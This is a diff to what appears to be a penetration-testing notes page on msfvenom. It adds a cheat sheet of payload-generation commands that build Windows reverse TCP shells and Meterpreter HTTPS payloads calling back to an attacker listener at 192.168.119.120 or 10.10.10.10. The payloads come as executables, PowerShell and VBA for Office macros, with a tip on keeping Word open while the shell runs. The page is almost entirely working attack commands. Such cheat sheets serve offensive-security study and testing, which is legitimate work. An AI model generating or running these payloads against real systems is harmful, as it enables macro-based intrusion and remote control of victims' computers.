@@ -9,7 +9,37 @@ metaLinks:
 
 ## Msfvenom
 
-```basic
+<figure><img src="../../../.gitbook/assets/Screenshot 2026-04-24 at 1.33.00 in the afternoon (1).png" alt=""><figcaption></figcaption></figure>
+
+#### &#x20;Why thread matters for Office:
+
+```bash
+  # BAD - This will close Word when shell exits
+  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f vbapplication
+  
+  # GOOD - Shell runs in separate thread, Word stays open
+  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
+```
+
+#### Practical msfvenom Examples
+
+```bash
+  # 32-bit reverse TCP shell (non-staged)
+  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe
+
+  # 32-bit Meterpreter HTTPS (staged) - for 32-bit Office
+  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
+
+  # 64-bit Meterpreter HTTPS (staged) - for 64-bit Office
+  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
+
+  # PowerShell format
+  msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
+```
+
+#### Execute and Raw File
+
+```bash
 # Execute and Raw File
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o rev.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o rev.exe
